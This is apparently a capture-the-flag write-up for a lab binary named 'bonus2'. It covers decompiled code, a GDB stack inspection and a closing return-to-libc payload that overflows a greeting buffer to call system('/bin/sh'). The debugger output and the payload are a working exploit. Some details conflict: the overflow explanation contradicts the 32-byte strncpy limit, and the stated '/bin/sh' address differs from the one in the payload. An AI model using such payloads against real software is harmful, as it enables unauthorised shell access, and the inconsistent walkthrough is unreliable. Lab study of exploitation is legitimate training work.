<h1 align="center"> BONUS 2</h1>

## üîç Analysis of Decompiled [bonus2](./bonus2.c)

The binary takes **two arguments** (`argv[1]` and `argv[2]`), copies them into stack buffers, and then prints a greeting string depending on the `LANG` environment variable.

- `argv[1]` ‚Üí copied into `buf1[40]`
- `argv[2]` ‚Üí copied into `buf2[36]` (but only 32 bytes are written with `strncpy`)

It also sets a global variable `language`:
- `LANG=fi` ‚Üí Finnish mode  
- `LANG=nl` ‚Üí Dutch mode  
- default ‚Üí English  

At the end, `greetuser()` is called with the contents of `buf1`.
That means if we pass in more than 32 characters for argv[2], the overflow will spill into the saved EBP / saved return address, allowing us to control execution.

---

### Vulnerability
The interesting part is in how the buffers are handled:

```c
char buf1[40];
char buf2[36];

strncpy(buf1, argv[1], 40);
strncpy(buf2, argv[2], 32);
```
- buf2 is 36 bytes, but strncpy writes only up to 32 bytes.
- This leaves 4 bytes of slack at the end of buf2 on the stack.

## üí• Exploit
### GDB verification
```
(gdb) break greetuser
Breakpoint 1 at 0x804848a
(gdb) run AAAAAAAAAAAAAAA BBBBBBBBBB
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAA BBBBBBBBBB

Breakpoint 1, 0x0804848a in greetuser ()
(gdb) info frame
Stack level 0, frame at 0xbffff670:
 eip = 0x804848a in greetuser; saved eip 0x8048630
 called by frame at 0xbffff730
 Arglist at 0xbffff668, args: 
 Locals at 0xbffff668, Previous frame's sp is 0xbffff670
 Saved registers:
  ebp at 0xbffff668, eip at 0xbffff66c
(gdb) x/200bx $ebp-0x80
0xbffff5e8:	0x18	0xf9	0xff	0xb7	0x16	0x9e	0xea	0xb7
0xbffff5f0:	0xf4	0xef	0xff	0xb7	0x63	0xc3	0xfe	0xb7
0xbffff5f8:	0xd0	0xfa	0xff	0xb7	0x48	0xcb	0xfd	0xb7
0xbffff600:	0x01	0x00	0x00	0x00	0x01	0x00	0x00	0x00
0xbffff608:	0x00	0x00	0x00	0x00	0x8d	0xd5	0xe5	0xb7
0xbffff610:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff618:	0x01	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff620:	0x3c	0x82	0x04	0x08	0x5c	0x99	0x04	0x08
0xbffff628:	0x4c	0x41	0x00	0x00	0x81	0xe2	0xe5	0xb7
0xbffff630:	0x33	0xff	0xff	0xbf	0xf8	0x38	0xe3	0xb7
0xbffff638:	0x02	0x00	0x00	0x00	0x96	0x39	0xec	0xb7
0xbffff640:	0x78	0xf6	0xff	0xbf	0xc0	0xf6	0xff	0xbf
0xbffff648:	0x00	0x00	0x00	0x00	0x0c	0xf7	0xff	0xbf
0xbffff650:	0x28	0xf7	0xff	0xbf	0xb0	0x26	0xff	0xb7
0xbffff658:	0x33	0xff	0xff	0xbf	0x80	0xd7	0xf5	0xb7
0xbffff660:	0x36	0xff	0xff	0xbf	0x18	0xf9	0xff	0xb7
0xbffff668:	0x28	0xf7	0xff	0xbf	0x30	0x86	0x04	0x08
0xbffff670:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffff678:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x00
0xbffff680:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff688:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff690:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff698:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xbffff6a0:	0x42	0x42	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff6a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
---
(gdb) x/s 0xbffff670
0xbffff670:	 'A' <repeats 15 times>
(gdb) x/xw $ebp+8   
0xbffff660:	0x41414141
(gdb) x/xw $ebp+48
0xbffff688:	0x42424242
(gdb) break *greetuser+155
Breakpoint 4 at 0x804851f
(gdb) continue
Continuing.

Breakpoint 4, 0x0804851f in greetuser ()
(gdb) x/s $ebp-0x48  
0xbffff610:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 ", 'A' <repeats 15 times>

```
- $ebp - 0x48 ‚Üí start of greeting_prefix
- $ebp - 0x44 ‚Üí start of greeting_msg
- $ebp+0x8 ‚Üí first argument
- $ebp+0xc ‚Üí second argument

This confirms:
- greeting_prefix lives at $ebp-0x48 (4 bytes)
- greeting_msg lives at $ebp-0x44 (64 bytes)
- strcat allows "buf1" to overflow past both, reaching saved EBP and return address.
From dynamic analysis with gdb:
- system()  -> 0xb7e6b060
- "/bin/sh" -> 0xb7e6b0fa

We craft argv[2] as:
"A"*18 + system_addr + "BBBB" + binsh_addr

## Payload
```sh
export LANG=fi
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x60\xb0\xe6\xb7"+ "BBBB"+ "\x58\xcc\xf8\xb7"')
```


